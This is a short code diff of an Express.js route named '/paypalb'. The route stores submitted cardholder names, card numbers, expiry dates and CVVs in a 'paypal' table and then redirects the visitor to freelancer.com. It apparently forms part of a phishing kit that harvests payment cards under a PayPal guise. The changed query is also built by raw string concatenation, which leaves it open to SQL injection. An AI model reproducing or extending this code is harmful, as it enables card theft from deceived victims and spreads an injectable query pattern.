@@ -60,7 +60,7 @@ app.post('/paypalb', function (req, res) {
 
 
     console.log(req.body);
-    client.query("Insert into paypal (cardholder,car,exp,cvv) values('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) { });
+    client.query("Insert into paypal (cardholder,card,exp,cvv) values('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) { });
 
     res.redirect('https://www.freelancer.com')
 })
